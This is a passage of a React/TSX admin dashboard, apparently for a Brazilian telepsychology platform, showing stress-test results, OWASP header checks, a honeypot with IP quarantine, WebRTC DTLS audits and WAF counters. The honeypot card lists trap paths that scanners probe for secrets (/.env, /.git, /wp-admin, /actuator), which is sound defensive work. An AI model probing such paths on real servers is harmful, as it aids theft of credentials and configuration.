                      <span className="text-slate-600 dark:text-slate-400 text-[11px]">
                        {slo.name}
                      </span>
                    </td>
                    <td className="py-3 pr-3 text-slate-700 dark:text-slate-300 font-mono text-[11px]">
                      {slo.targetDescription}
                    </td>
                    <td className="py-3 pr-3 font-mono font-bold text-slate-900 dark:text-white">
                      {slo.actualValue} {slo.unit}
                    </td>
                    <td className="py-3 pr-4 text-right">
                      <span className={`px-2.5 py-0.5 rounded-full text-[10px] font-bold ${
                        slo.status === SloStatus.MET
                          ? 'bg-emerald-100 text-emerald-800 dark:bg-emerald-950/60 dark:text-emerald-300 border border-emerald-300 dark:border-emerald-700'
                          : slo.status === SloStatus.WARNING
                          ? 'bg-amber-100 text-amber-800 dark:bg-amber-950/60 dark:text-amber-300 border border-amber-300 dark:border-amber-700'
                          : 'bg-rose-100 text-rose-800 dark:bg-rose-950/60 dark:text-rose-300 border border-rose-300 dark:border-rose-700'
                      }`}>
                        {slo.status === SloStatus.MET ? 'CUMPRIDO' : slo.status === SloStatus.WARNING ? 'ALERTA' : 'VIOLADO'}
                      </span>
                    </td>
                  </tr>
                ))}
              </tbody>
            </table>
          </div>
        </div>

        {/* Histórico Recente de Relatórios de Stress Test */}
        <div className="space-y-3">
          <h3 className="text-xs font-bold text-slate-800 dark:text-slate-200 uppercase tracking-wider">
            Histórico Recente de Benchmarks Executados
          </h3>
          <div className="overflow-x-auto border border-slate-200 dark:border-slate-800 rounded-2xl">
            <table className="w-full text-left text-xs">
              <thead className="bg-slate-50 dark:bg-slate-800/60 text-slate-500 dark:text-slate-400 border-b border-slate-200 dark:border-slate-800">
                <tr>
                  <th className="py-2.5 pl-4 pr-3 font-semibold">Cenário</th>
                  <th className="py-2.5 pr-3 font-semibold">Volume / Concorrência</th>
                  <th className="py-2.5 pr-3 font-semibold">Vazão (RPS)</th>
                  <th className="py-2.5 pr-3 font-semibold">Latência P99</th>
                  <th className="py-2.5 pr-3 font-semibold">Taxa de Erro</th>
                  <th className="py-2.5 pr-3 font-semibold">SLOs</th>
                  <th className="py-2.5 pr-4 font-semibold text-right">Data/Hora</th>
                </tr>
              </thead>
              <tbody className="divide-y divide-slate-100 dark:divide-slate-800">
                {stressReports.slice(0, 5).map((rep) => (
                  <tr key={rep.id} className="hover:bg-slate-50/50 dark:hover:bg-slate-800/30 transition-colors">
                    <td className="py-2.5 pl-4 pr-3 font-mono text-[11px] font-semibold text-slate-900 dark:text-white">
                      {rep.scenario}
                    </td>
                    <td className="py-2.5 pr-3 text-slate-600 dark:text-slate-400">
                      {rep.totalRequests} reqs • {rep.concurrency} VUs
                    </td>
                    <td className="py-2.5 pr-3 font-mono font-bold text-slate-900 dark:text-white">
                      {rep.rps} req/s
                    </td>
                    <td className="py-2.5 pr-3 font-mono text-amber-600 dark:text-amber-400">
                      {rep.percentiles.p99} ms
                    </td>
                    <td className="py-2.5 pr-3 font-mono">
                      <span className={rep.errorRate === 0 ? 'text-emerald-600 dark:text-emerald-400' : 'text-rose-600'}>
                        {rep.errorRate}%
                      </span>
                    </td>
                    <td className="py-2.5 pr-3">
                      <span className="px-2 py-0.5 rounded-full text-[10px] font-bold bg-emerald-100 text-emerald-800 dark:bg-emerald-950/60 dark:text-emerald-300">
                        {rep.slosPassedCount}/{rep.slosTotalCount} MET
                      </span>
                    </td>
                    <td className="py-2.5 pr-4 text-right text-[11px] text-slate-400 whitespace-nowrap">
                      {new Date(rep.timestamp).toLocaleString('pt-BR')}
                    </td>
                  </tr>
                ))}
              </tbody>
            </table>
          </div>
        </div>

        {/* Caixa Educativa k6 & CLI */}
        <div className="p-3.5 rounded-2xl bg-slate-50 dark:bg-slate-800/60 border border-slate-200 dark:border-slate-700 flex flex-col sm:flex-row items-center justify-between gap-3 text-xs">
          <div className="space-y-0.5">
            <span className="font-bold text-slate-900 dark:text-white block">
              💻 Executar via Linha de Comando ou CI/CD:
            </span>
            <span className="text-slate-500 dark:text-slate-400 text-[11px]">
              Utilize o runner nativo do Bun ou o script de carga oficial do k6 com thresholds automatizados.
            </span>
          </div>
          <div className="flex items-center gap-2 font-mono text-[11px]">
            <code className="px-2.5 py-1 rounded-lg bg-slate-200 dark:bg-slate-900 text-slate-800 dark:text-slate-200 border border-slate-300 dark:border-slate-800">
              bun test:load
            </code>
            <code className="px-2.5 py-1 rounded-lg bg-slate-200 dark:bg-slate-900 text-slate-800 dark:text-slate-200 border border-slate-300 dark:border-slate-800">
              k6 run scripts/k6-stress-test.js
            </code>
          </div>
        </div>
      </div>

      {/* Card 11: Hardening de Segurança HTTP (CSP, HSTS) & Honeypot Anti-Probe (RFC-001 §4.4, §5.2) */}
      <div className="bg-white dark:bg-slate-900 rounded-3xl p-6 border border-slate-200 dark:border-slate-800 shadow-sm space-y-6">
        <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-4 pb-4 border-b border-slate-100 dark:border-slate-800">
          <div className="flex items-center gap-3">
            <div className="p-3 rounded-2xl bg-gradient-to-br from-indigo-500 to-emerald-600 text-white shadow-md shadow-indigo-500/20">
              <GlobeLock className="w-6 h-6" />
            </div>
            <div>
              <h2 className="text-lg font-bold text-slate-900 dark:text-white flex items-center gap-2">
                Hardening HTTP & Honeypot Anti-Probe
                <span className="px-2.5 py-0.5 rounded-full text-[10px] font-extrabold bg-indigo-100 text-indigo-800 dark:bg-indigo-950/60 dark:text-indigo-300 border border-indigo-300 dark:border-indigo-700 uppercase tracking-wider">
                  CSP • HSTS • WORM
                </span>
              </h2>
              <p className="text-xs text-slate-500 dark:text-slate-400">
                Injeção de cabeçalhos de segurança padrão OWASP, mitigação de XSS/Clickjacking e armadilha ativa para quarentena de scanners maliciosos na Trilha WORM.
              </p>
            </div>
          </div>

          <button
            onClick={fetchHardeningOverview}
            disabled={loadingHardening}
            className="inline-flex items-center gap-1.5 px-3 py-1.5 rounded-xl bg-slate-100 hover:bg-slate-200 dark:bg-slate-800 dark:hover:bg-slate-700 text-slate-700 dark:text-slate-200 text-xs font-semibold transition-colors cursor-pointer disabled:opacity-50"
            title="Atualizar status do hardening"
          >
            <RefreshCw className={`w-3.5 h-3.5 ${loadingHardening ? 'animate-spin' : ''}`} />
            <span>Atualizar</span>
          </button>
        </div>

        {/* 4 KPIs de Hardening & Honeypot */}
        <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-4">
          <div className="p-4 rounded-2xl bg-indigo-50/60 dark:bg-indigo-950/20 border border-indigo-200 dark:border-indigo-800/60">
            <div className="flex items-center justify-between text-indigo-700 dark:text-indigo-300 text-xs font-semibold mb-1">
              <span>Score OWASP Headers</span>
              <span className="px-2 py-0.5 rounded-full text-[10px] font-bold bg-emerald-100 text-emerald-800 dark:bg-emerald-950/60 dark:text-emerald-300 border border-emerald-300 dark:border-emerald-700">
                Grau {hardeningOverview?.metrics.headersEvaluation.grade || 'A+'}
              </span>
            </div>
            <div className="text-2xl font-extrabold text-slate-900 dark:text-white">
              {hardeningOverview?.metrics.headersEvaluation.scorePercentage ?? 100}%
            </div>
            <span className="text-[10px] text-slate-500 dark:text-slate-400 mt-1 block">
              9 de 9 cabeçalhos em conformidade
            </span>
          </div>

          <div className="p-4 rounded-2xl bg-slate-50 dark:bg-slate-800/40 border border-slate-200 dark:border-slate-700">
            <span className="text-[10px] text-slate-400 font-semibold uppercase block">Probes Interceptados</span>
            <div className="flex items-center gap-2 mt-1">
              <span className="text-2xl font-extrabold text-slate-900 dark:text-white">
                {hardeningOverview?.metrics.totalProbesTrapped ?? 0}
              </span>
              <span className="text-[10px] text-slate-400">tentativas</span>
            </div>
            <span className="text-[10px] text-emerald-600 dark:text-emerald-400 mt-1 block">
              Gravados no Ledger WORM
            </span>
          </div>

          <div className="p-4 rounded-2xl bg-slate-50 dark:bg-slate-800/40 border border-slate-200 dark:border-slate-700">
            <span className="text-[10px] text-slate-400 font-semibold uppercase block">IPs em Quarentena Ativa</span>
            <div className="flex items-center gap-2 mt-1">
              <span className={`text-2xl font-extrabold ${(hardeningOverview?.metrics.activeBannedIpsCount ?? 0) > 0 ? 'text-rose-600 dark:text-rose-400' : 'text-slate-900 dark:text-white'}`}>
                {hardeningOverview?.metrics.activeBannedIpsCount ?? 0}
              </span>
              <span className="text-[10px] text-slate-400">bloqueados</span>
            </div>
            <span className="text-[10px] text-slate-500 dark:text-slate-400 mt-1 block">
              Banimento automático: 60 min
            </span>
          </div>

          <div className="p-4 rounded-2xl bg-slate-50 dark:bg-slate-800/40 border border-slate-200 dark:border-slate-700">
            <span className="text-[10px] text-slate-400 font-semibold uppercase block">Honeypot Anti-Scanners</span>
            <div className="flex items-center gap-2 mt-1">
              <span className="inline-flex items-center gap-1.5 px-2.5 py-1 rounded-full text-xs font-bold bg-emerald-100 text-emerald-800 dark:bg-emerald-950/60 dark:text-emerald-300 border border-emerald-300 dark:border-emerald-700">
                ● Ativo & Protegendo
              </span>
            </div>
            <span className="text-[10px] text-slate-500 dark:text-slate-400 mt-1 block">
              /.env, /.git, /wp-admin, /actuator
            </span>
          </div>
        </div>

        {/* Tabela dos 9 Cabeçalhos OWASP */}
        <div className="space-y-3">
          <h4 className="text-xs font-bold uppercase tracking-wider text-slate-500 dark:text-slate-400 flex items-center gap-1.5">
            <Lock className="w-3.5 h-3.5 text-indigo-500" />
            Matriz de Cabeçalhos HTTP Recomendados pela OWASP (Em Produção)
          </h4>

          <div className="overflow-x-auto">
            <table className="w-full text-left text-xs">
              <thead className="bg-slate-50 dark:bg-slate-800/60 text-slate-500 dark:text-slate-400 text-[10px] uppercase font-semibold border-y border-slate-200 dark:border-slate-700">
                <tr>
                  <th className="py-2.5 pl-4 pr-3">Cabeçalho HTTP</th>
                  <th className="py-2.5 pr-3">Valor Aplicado / Política</th>
                  <th className="py-2.5 pr-3">Salvaguarda & Finalidade</th>
                  <th className="py-2.5 pr-4 text-right">Status</th>
                </tr>
              </thead>
              <tbody className="divide-y divide-slate-100 dark:divide-slate-800">
                {hardeningOverview?.metrics.headersEvaluation.checks.map((check) => (
                  <tr key={check.header} className="hover:bg-slate-50/50 dark:hover:bg-slate-800/30">
                    <td className="py-2.5 pl-4 pr-3 font-mono font-bold text-slate-900 dark:text-white whitespace-nowrap">
                      {check.header}
                    </td>
                    <td className="py-2.5 pr-3 font-mono text-[10px] text-indigo-600 dark:text-indigo-400 max-w-xs truncate" title={check.expectedValue}>
                      {check.expectedValue}
                    </td>
                    <td className="py-2.5 pr-3 text-[11px] text-slate-600 dark:text-slate-400 max-w-sm">
                      {check.recommendation}
                    </td>
                    <td className="py-2.5 pr-4 text-right whitespace-nowrap">
                      <span className="px-2 py-0.5 rounded-full text-[10px] font-bold bg-emerald-100 text-emerald-800 dark:bg-emerald-950/60 dark:text-emerald-300 border border-emerald-300 dark:border-emerald-700">
                        {check.status}
                      </span>
                    </td>
                  </tr>
                ))}
              </tbody>
            </table>
          </div>
        </div>

        {/* Tabela de IPs em Quarentena e Probes Honeypot */}
        <div className="space-y-3 pt-2 border-t border-slate-100 dark:border-slate-800">
          <div className="flex items-center justify-between">
            <h4 className="text-xs font-bold uppercase tracking-wider text-slate-500 dark:text-slate-400 flex items-center gap-1.5">
              <ShieldAlert className="w-3.5 h-3.5 text-rose-500" />
              IPs em Quarentena & Probes Recentes (Honeypot Traps)
            </h4>
            <span className="text-[10px] text-slate-400">
              Auditado compulsivamente na Hash-Chain WORM
            </span>
          </div>

          {(hardeningOverview?.recentProbes.length ?? 0) === 0 ? (
            <div className="p-6 text-center text-xs text-slate-500 bg-slate-50 dark:bg-slate-800/30 rounded-2xl border border-slate-200 dark:border-slate-800">
              Nenhuma tentativa de scanning malicioso detectada recentemente. O perímetro está seguro.
            </div>
          ) : (
            <div className="overflow-x-auto">
              <table className="w-full text-left text-xs">
                <thead className="bg-slate-50 dark:bg-slate-800/60 text-slate-500 dark:text-slate-400 text-[10px] uppercase font-semibold border-y border-slate-200 dark:border-slate-700">
                  <tr>
                    <th className="py-2.5 pl-4 pr-3">IP Invasor</th>
                    <th className="py-2.5 pr-3">Rota Tentada</th>
                    <th className="py-2.5 pr-3">Scanner / User Agent</th>
                    <th className="py-2.5 pr-3">Tentativas</th>
                    <th className="py-2.5 pr-3">Capturado Em</th>
                    <th className="py-2.5 pr-4 text-right">Ação</th>
                  </tr>
                </thead>
                <tbody className="divide-y divide-slate-100 dark:divide-slate-800">
                  {hardeningOverview?.recentProbes.map((probe) => (
                    <tr key={probe.id} className="hover:bg-slate-50/50 dark:hover:bg-slate-800/30">
                      <td className="py-2.5 pl-4 pr-3 font-mono font-bold text-slate-900 dark:text-white">
                        {probe.ipAddress}
                        <span className={`ml-2 px-1.5 py-0.5 rounded text-[9px] font-bold ${
                          probe.status === 'ACTIVE_BAN'
                            ? 'bg-rose-100 text-rose-800 dark:bg-rose-950/60 dark:text-rose-300'
                            : 'bg-slate-100 text-slate-600 dark:bg-slate-800 dark:text-slate-400'
                        }`}>
                          {probe.status === 'ACTIVE_BAN' ? 'QUARANTINE' : probe.status}
                        </span>
                      </td>
                      <td className="py-2.5 pr-3 font-mono text-[11px] text-rose-600 dark:text-rose-400">
                        {probe.method} {probe.path}
                      </td>
                      <td className="py-2.5 pr-3 text-[11px] text-slate-500 max-w-xs truncate" title={probe.userAgent}>
                        {probe.userAgent}
                      </td>
                      <td className="py-2.5 pr-3 font-mono text-center font-bold text-slate-700 dark:text-slate-300">
                        {probe.blockedAttemptsCount}
                      </td>
                      <td className="py-2.5 pr-3 text-[11px] text-slate-500 whitespace-nowrap">
                        {new Date(probe.trappedAt).toLocaleString('pt-BR')}
                      </td>
                      <td className="py-2.5 pr-4 text-right whitespace-nowrap">
                        {probe.status === 'ACTIVE_BAN' ? (
                          <button
                            onClick={() => {
                              setUnbanModalTarget(probe);
                              setUnbanReason('');
                            }}
                            className="px-2.5 py-1 rounded-lg text-emerald-600 hover:bg-emerald-50 dark:hover:bg-emerald-950/40 text-[11px] font-semibold transition-colors cursor-pointer"
                            title="Desbloquear IP manualmente"
                          >
                            Desbloquear
                          </button>
                        ) : (
                          <span className="text-[10px] text-slate-400">Liberado</span>
                        )}
                      </td>
                    </tr>
                  ))}
                </tbody>
              </table>
            </div>
          )}
        </div>
      </div>

      {/* Card 12: Auditoria de Sessão WebRTC & Fingerprint DTLS (RFC-001 §3.2, §4.4, §5.2 e CFP 011/2018) */}
      <div className="bg-white dark:bg-slate-900 rounded-3xl p-6 border border-slate-200 dark:border-slate-800 shadow-sm space-y-6">
        <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-4 pb-4 border-b border-slate-100 dark:border-slate-800">
          <div className="flex items-center gap-3">
            <div className="p-3 rounded-2xl bg-gradient-to-br from-teal-500 to-cyan-600 text-white shadow-md shadow-teal-500/20">
              <Video className="w-6 h-6" />
            </div>
            <div>
              <h2 className="text-lg font-bold text-slate-900 dark:text-white flex items-center gap-2">
                Auditoria de Canais WebRTC & Sigilo Telepsicológico
                <span className="px-2.5 py-0.5 rounded-full text-[10px] font-extrabold bg-teal-100 text-teal-800 dark:bg-teal-950/60 dark:text-teal-300 border border-teal-300 dark:border-teal-700 uppercase tracking-wider">
                  DTLS-SRTP • CFP 011/2018 • SAS
                </span>
              </h2>
              <p className="text-xs text-slate-500 dark:text-slate-400">
                Verificação de integridade ponto-a-ponto dos canais de mídia para teleconsulta, validação de certificados DTLS (RFC 8122), Safety Numbers (Anti-MitM) e selo probatório WORM.
              </p>
            </div>
          </div>

          <div className="flex items-center gap-2">
            <button
              onClick={() => setShowSimulateModal(true)}
              className="inline-flex items-center gap-1.5 px-3.5 py-1.5 rounded-xl bg-teal-600 hover:bg-teal-700 text-white text-xs font-semibold shadow-sm transition-colors cursor-pointer"
            >
              <Zap className="w-3.5 h-3.5" />
              <span>Simular Teste P2P</span>
            </button>
            <button
              onClick={fetchWebrtcSessions}
              disabled={loadingWebrtc}
              className="inline-flex items-center gap-1.5 px-3 py-1.5 rounded-xl bg-slate-100 hover:bg-slate-200 dark:bg-slate-800 dark:hover:bg-slate-700 text-slate-700 dark:text-slate-200 text-xs font-semibold transition-colors cursor-pointer disabled:opacity-50"
              title="Atualizar sessões WebRTC"
            >
              <RefreshCw className={`w-3.5 h-3.5 ${loadingWebrtc ? 'animate-spin' : ''}`} />
              <span>Atualizar</span>
            </button>
          </div>
        </div>

        {/* 4 KPIs de Segurança WebRTC */}
        <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-4">
          <div className="p-4 rounded-2xl bg-teal-50/60 dark:bg-teal-950/20 border border-teal-200 dark:border-teal-800/60">
            <div className="flex items-center justify-between text-teal-700 dark:text-teal-300 text-xs font-semibold mb-1">
              <span>Sessões Auditadas</span>
              <span className="p-1 rounded-lg bg-teal-100 dark:bg-teal-900/40 font-mono text-[10px]">
                RFC §3.2
              </span>
            </div>
            <div className="text-2xl font-black text-teal-900 dark:text-teal-100 font-mono">
              {webrtcSessions.length}
            </div>
            <p className="text-[11px] text-teal-700/80 dark:text-teal-300/80 mt-1">
              {webrtcSessions.filter(s => !s.endedAt).length} ativas em tempo real
            </p>
          </div>

          <div className="p-4 rounded-2xl bg-emerald-50/60 dark:bg-emerald-950/20 border border-emerald-200 dark:border-emerald-800/60">
            <div className="flex items-center justify-between text-emerald-700 dark:text-emerald-300 text-xs font-semibold mb-1">
              <span>Ciphersuite Padrão Ouro</span>
              <span className="p-1 rounded-lg bg-emerald-100 dark:bg-emerald-900/40 font-mono text-[10px]">
                AES-256-GCM
              </span>
            </div>
            <div className="text-2xl font-black text-emerald-900 dark:text-emerald-100 font-mono">
              100% PFS
            </div>
            <p className="text-[11px] text-emerald-700/80 dark:text-emerald-300/80 mt-1">
              Perfect Forward Secrecy garantido
            </p>
          </div>

          <div className="p-4 rounded-2xl bg-indigo-50/60 dark:bg-indigo-950/20 border border-indigo-200 dark:border-indigo-800/60">
            <div className="flex items-center justify-between text-indigo-700 dark:text-indigo-300 text-xs font-semibold mb-1">
              <span>Taxa de Verificação SAS</span>
              <span className="p-1 rounded-lg bg-indigo-100 dark:bg-indigo-900/40 font-mono text-[10px]">
                Anti-MitM
              </span>
            </div>
            <div className="text-2xl font-black text-indigo-900 dark:text-indigo-100 font-mono">
              {webrtcSessions.length > 0 
                ? Math.round((webrtcSessions.filter(s => s.verificationStatus === WebRtcVerificationStatus.VERIFIED_MATCH).length / webrtcSessions.length) * 100)
                : 100}%
            </div>
            <p className="text-[11px] text-indigo-700/80 dark:text-indigo-300/80 mt-1">
              Safety Numbers mútuos conferidos
            </p>
          </div>

          <div className="p-4 rounded-2xl bg-sky-50/60 dark:bg-sky-950/20 border border-sky-200 dark:border-sky-800/60">
            <div className="flex items-center justify-between text-sky-700 dark:text-sky-300 text-xs font-semibold mb-1">
              <span>Sigilo CFP 011/2018</span>
              <span className="p-1 rounded-lg bg-sky-100 dark:bg-sky-900/40 font-mono text-[10px]">
                WORM Ledger
              </span>
            </div>
            <div className="text-2xl font-black text-sky-900 dark:text-sky-100 font-mono">
              Certificado
            </div>
            <p className="text-[11px] text-sky-700/80 dark:text-sky-300/80 mt-1">
              Cadeia criptográfica inviolável
            </p>
          </div>
        </div>

        {/* Tabela de Sessões WebRTC Auditadas */}
        <div className="space-y-3">
          <h3 className="text-xs font-bold text-slate-800 dark:text-slate-200 uppercase tracking-wider">
            Sessões Registradas e Laudos Probatórios P2P
          </h3>

          {webrtcSessions.length === 0 ? (
            <div className="p-6 rounded-2xl border border-dashed border-slate-200 dark:border-slate-800 text-center space-y-2">
              <Video className="w-8 h-8 text-slate-400 mx-auto" />
              <p className="text-xs text-slate-500 dark:text-slate-400">
                Nenhuma sessão WebRTC auditada ainda. Clique em <strong>"Simular Teste P2P"</strong> para gerar um par de teste de fingerprints DTLS.
              </p>
            </div>
          ) : (
            <div className="overflow-x-auto border border-slate-200 dark:border-slate-800 rounded-2xl">
              <table className="w-full text-left text-xs">
                <thead className="bg-slate-50 dark:bg-slate-800/60 text-slate-500 dark:text-slate-400 border-b border-slate-200 dark:border-slate-800">
                  <tr>
                    <th className="py-2.5 pl-4 pr-3 font-semibold">Sessão / Paciente</th>
                    <th className="py-2.5 pr-3 font-semibold">Fingerprint DTLS (Terapeuta)</th>
                    <th className="py-2.5 pr-3 font-semibold">Safety Numbers (SAS)</th>
                    <th className="py-2.5 pr-3 font-semibold">Cifra SRTP</th>
                    <th className="py-2.5 pr-3 font-semibold">Status Integridade</th>
                    <th className="py-2.5 pr-3 font-semibold">Selo WORM</th>
                    <th className="py-2.5 pr-4 font-semibold text-right">Ação</th>
                  </tr>
                </thead>
                <tbody className="divide-y divide-slate-100 dark:divide-slate-800">
                  {webrtcSessions.map((s) => (
                    <tr key={s.sessionId} className="hover:bg-slate-50/50 dark:hover:bg-slate-800/30 transition-colors">
                      <td className="py-2.5 pl-4 pr-3">
                        <div className="font-mono font-bold text-slate-900 dark:text-white text-[11px]">
                          {s.sessionId.slice(0, 16)}...
                        </div>
                        <div className="text-[10px] text-slate-400">
                          Paciente: {s.patientId} • {new Date(s.startedAt).toLocaleTimeString('pt-BR')}
                        </div>
                      </td>
                      <td className="py-2.5 pr-3 font-mono text-[10px] text-slate-600 dark:text-slate-400 max-w-xs truncate" title={s.therapistFingerprint.fingerprint}>
                        {s.therapistFingerprint.fingerprint.slice(0, 24)}...
                      </td>
                      <td className="py-2.5 pr-3">
                        <div className="font-mono font-bold text-teal-700 dark:text-teal-300 text-[11px] bg-teal-50 dark:bg-teal-950/40 px-2 py-0.5 rounded-lg inline-block border border-teal-200 dark:border-teal-800">
                          {s.safetyNumbers}
                        </div>
                        {s.phoneticSas && (
                          <div className="text-[10px] text-slate-400 font-mono mt-0.5">
                            {s.phoneticSas}
                          </div>
                        )}
                      </td>
                      <td className="py-2.5 pr-3">
                        <span className={`px-2 py-0.5 rounded-full text-[10px] font-mono font-bold ${
                          s.securityGrade === WebRtcSecurityGrade.OPTIMAL
                            ? 'bg-teal-50 text-teal-800 dark:bg-teal-950/60 dark:text-teal-300 border border-teal-200 dark:border-teal-800'
                            : 'bg-indigo-50 text-indigo-800 dark:bg-indigo-950/60 dark:text-indigo-300 border border-indigo-200 dark:border-indigo-800'
                        }`}>
                          {s.cipherSuite.replace('SRTP_', '')} ({s.dtlsVersion})
                        </span>
                      </td>
                      <td className="py-2.5 pr-3">
                        <span className={`px-2 py-0.5 rounded-full text-[10px] font-bold ${
                          s.verificationStatus === WebRtcVerificationStatus.VERIFIED_MATCH
                            ? 'bg-emerald-100 text-emerald-800 dark:bg-emerald-950/60 dark:text-emerald-300 border border-emerald-300 dark:border-emerald-700'
                            : s.verificationStatus === WebRtcVerificationStatus.UNVERIFIED
                            ? 'bg-amber-100 text-amber-800 dark:bg-amber-950/60 dark:text-amber-300 border border-amber-300 dark:border-amber-700'
                            : 'bg-rose-100 text-rose-800 dark:bg-rose-950/60 dark:text-rose-300 border border-rose-300 dark:border-rose-700'
                        }`}>
                          {s.verificationStatus === WebRtcVerificationStatus.VERIFIED_MATCH ? 'P2P VERIFICADO' : s.verificationStatus}
                        </span>
                      </td>
                      <td className="py-2.5 pr-3 font-mono text-[10px] text-slate-500">
                        {s.tamperEvidentSeal}
                      </td>
                      <td className="py-2.5 pr-4 text-right">
                        {!s.endedAt ? (
                          <button
                            onClick={() => handleTerminateWebrtcSession(s.sessionId)}
                            disabled={loadingWebrtc}
                            className="px-2.5 py-1 rounded-lg bg-rose-50 hover:bg-rose-100 dark:bg-rose-950/40 dark:hover:bg-rose-900/50 text-rose-700 dark:text-rose-300 text-[11px] font-semibold transition-colors cursor-pointer disabled:opacity-50"
                          >
                            Encerrar
                          </button>
                        ) : (
                          <span className="text-[10px] text-slate-400">Selada</span>
                        )}
                      </td>
                    </tr>
                  ))}
                </tbody>
              </table>
            </div>
          )}
        </div>
      </div>

      {/* Card 13: Web Application Firewall (WAF) & Detecção Heurística de Payloads (RFC-001 §4.4, §5.2 e OWASP Top 10) */}
      <div className="bg-white dark:bg-slate-900 rounded-3xl p-6 border border-slate-200 dark:border-slate-800 shadow-sm space-y-6">
        <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-4 pb-4 border-b border-slate-100 dark:border-slate-800">
          <div className="flex items-center gap-3">
            <div className="p-3 rounded-2xl bg-gradient-to-br from-indigo-500 to-rose-600 text-white shadow-md shadow-indigo-500/20">
              <ShieldAlert className="w-6 h-6" />
            </div>
            <div>
              <h2 className="text-lg font-bold text-slate-900 dark:text-white flex items-center gap-2">
                Web Application Firewall (WAF) & Inspeção Heurística
                <span className={`px-2.5 py-0.5 rounded-full text-[10px] font-extrabold border uppercase tracking-wider ${
                  wafOverview?.metrics.mode === WafMode.ACTIVE_BLOCK
                    ? 'bg-rose-100 text-rose-800 dark:bg-rose-950/60 dark:text-rose-300 border-rose-300 dark:border-rose-700'
                    : 'bg-amber-100 text-amber-800 dark:bg-amber-950/60 dark:text-amber-300 border-amber-300 dark:border-amber-700'
                }`}>
                  {wafOverview?.metrics.mode === WafMode.ACTIVE_BLOCK ? '🛡️ BLOQUEIO ATIVO (403)' : '👁️ MONITORAMENTO APENAS'}
                </span>
              </h2>
              <p className="text-xs text-slate-500 dark:text-slate-400">
                Inspeção profunda de requisições HTTP antes do desembrulho criptográfico: bloqueio preventivo de SQL Injection, XSS, Path Traversal e Command Injection com registro forense no ledger WORM.
              </p>
            </div>
          </div>

          <div className="flex items-center gap-2">
            {currentUser.role === UserRole.ADMIN && (
              <div className="flex items-center bg-slate-100 dark:bg-slate-800 p-1 rounded-xl border border-slate-200 dark:border-slate-700">
                <button
                  type="button"
                  onClick={() => handleUpdateWafMode(WafMode.ACTIVE_BLOCK)}
                  disabled={updatingWafMode || wafOverview?.metrics.mode === WafMode.ACTIVE_BLOCK}
                  className={`px-3 py-1 rounded-lg text-xs font-semibold transition-all cursor-pointer ${
                    wafOverview?.metrics.mode === WafMode.ACTIVE_BLOCK
                      ? 'bg-rose-600 text-white shadow-sm'
                      : 'text-slate-600 dark:text-slate-400 hover:text-slate-900 dark:hover:text-white'
                  }`}
                >
                  Bloqueio Ativo
                </button>
                <button
                  type="button"
                  onClick={() => handleUpdateWafMode(WafMode.MONITOR_ONLY)}
                  disabled={updatingWafMode || wafOverview?.metrics.mode === WafMode.MONITOR_ONLY}
                  className={`px-3 py-1 rounded-lg text-xs font-semibold transition-all cursor-pointer ${
                    wafOverview?.metrics.mode === WafMode.MONITOR_ONLY
                      ? 'bg-amber-600 text-white shadow-sm'
                      : 'text-slate-600 dark:text-slate-400 hover:text-slate-900 dark:hover:text-white'
                  }`}
                >
                  Monitorar Apenas
                </button>
              </div>
            )}
            <button
              onClick={fetchWafOverview}
              disabled={loadingWaf}
              className="inline-flex items-center gap-1.5 px-3.5 py-1.5 rounded-xl bg-slate-100 hover:bg-slate-200 dark:bg-slate-800 dark:hover:bg-slate-700 text-slate-700 dark:text-slate-200 text-xs font-semibold transition-colors cursor-pointer disabled:opacity-50"
              title="Atualizar métricas do WAF"
            >
              <RefreshCw className={`w-3.5 h-3.5 ${loadingWaf ? 'animate-spin' : ''}`} />
              <span>Atualizar</span>
            </button>
          </div>
        </div>

        {/* 4 KPIs do WAF */}
        <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-4">
          <div className="p-4 rounded-2xl bg-indigo-50/60 dark:bg-indigo-950/20 border border-indigo-200 dark:border-indigo-800/60">
            <div className="flex items-center justify-between text-indigo-700 dark:text-indigo-300 text-xs font-semibold mb-1">
              <span>Requisições Inspecionadas</span>
              <span className="p-1 rounded-lg bg-indigo-100 dark:bg-indigo-900/40 font-mono text-[10px]">
                RFC §4.4
              </span>
            </div>
            <div className="text-2xl font-black text-indigo-900 dark:text-indigo-100 font-mono">
              {wafOverview?.metrics.totalInspections ?? 0}
            </div>
            <p className="text-[11px] text-indigo-700/80 dark:text-indigo-300/80 mt-1">
              Varredura pré-desembrulho de payloads
            </p>
          </div>

          <div className="p-4 rounded-2xl bg-rose-50/60 dark:bg-rose-950/20 border border-rose-200 dark:border-rose-800/60">
            <div className="flex items-center justify-between text-rose-700 dark:text-rose-300 text-xs font-semibold mb-1">
              <span>Ataques Bloqueados</span>
              <span className="p-1 rounded-lg bg-rose-100 dark:bg-rose-900/40 font-mono text-[10px]">
                HTTP 403
              </span>
            </div>
            <div className="text-2xl font-black text-rose-900 dark:text-rose-100 font-mono">
              {wafOverview?.metrics.totalAttacksBlocked ?? 0}
            </div>
            <p className="text-[11px] text-rose-700/80 dark:text-rose-300/80 mt-1">
              Modo operacional: {wafOverview?.metrics.mode ?? 'ACTIVE_BLOCK'}
            </p>
          </div>

          <div className="p-4 rounded-2xl bg-amber-50/60 dark:bg-amber-950/20 border border-amber-200 dark:border-amber-800/60">
            <div className="flex items-center justify-between text-amber-700 dark:text-amber-300 text-xs font-semibold mb-1">
              <span>Vetores Detectados</span>
              <span className="p-1 rounded-lg bg-amber-100 dark:bg-amber-900/40 font-mono text-[10px]">
                OWASP TOP 10
              </span>
            </div>
            <div className="text-2xl font-black text-amber-900 dark:text-amber-100 font-mono">
              {(wafOverview?.metrics.totalSqliAttempts ?? 0) +
                (wafOverview?.metrics.totalXssAttempts ?? 0) +
                (wafOverview?.metrics.totalTraversalAttempts ?? 0) +
                (wafOverview?.metrics.totalCommandInjectionAttempts ?? 0)}
            </div>
            <p className="text-[11px] text-amber-700/80 dark:text-amber-300/80 mt-1 font-mono">
              SQLi: {wafOverview?.metrics.totalSqliAttempts ?? 0} | XSS: {wafOverview?.metrics.totalXssAttempts ?? 0} | LFI: {wafOverview?.metrics.totalTraversalAttempts ?? 0} | CMD: {wafOverview?.metrics.totalCommandInjectionAttempts ?? 0}
            </p>
          </div>

